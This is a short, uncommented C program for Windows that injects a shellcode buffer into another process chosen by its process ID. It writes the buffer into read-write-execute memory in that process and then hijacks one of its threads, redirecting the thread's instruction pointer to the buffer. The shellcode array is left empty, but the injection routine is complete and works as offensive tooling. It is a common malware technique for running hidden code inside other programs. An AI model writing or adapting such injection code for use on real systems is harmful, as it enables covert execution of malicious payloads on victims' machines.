#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_thread;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);

    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(h_snapshot, &threadEntry);

	while (Thread32Next(h_snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == (atoi(argv[1])))
		{
			h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

    SuspendThread(h_thread);

    GetThreadContext(h_thread, &context);
	context.Rip = (DWORD_PTR)b_shellcode;
	SetThreadContext(h_thread, &context);
	
	ResumeThread(h_thread);

}